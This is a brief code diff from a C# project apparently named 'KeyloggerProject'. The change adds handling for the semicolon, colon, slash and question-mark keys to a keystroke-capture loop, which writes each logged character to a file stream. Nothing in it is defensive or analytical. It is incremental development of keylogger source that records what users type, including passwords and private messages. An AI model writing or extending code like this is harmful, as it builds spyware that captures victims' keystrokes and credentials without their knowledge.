@@ -200,6 +200,16 @@ namespace KeyloggerProject
 
 
                         }
+                        // Special character handling
+                        else if (key == Keys.Oem1) // ; or :
+                        {
+                            currentText += isShiftPressed ? ":" : ";";
+                        }
+                        else if (key == Keys.Oem2) // / or ?
+                        {
+                            currentText += isShiftPressed ? "?" : "/";
+                        }
+
                         sw.Write(currentText);
                         sw.Flush();
                         currentText = "";
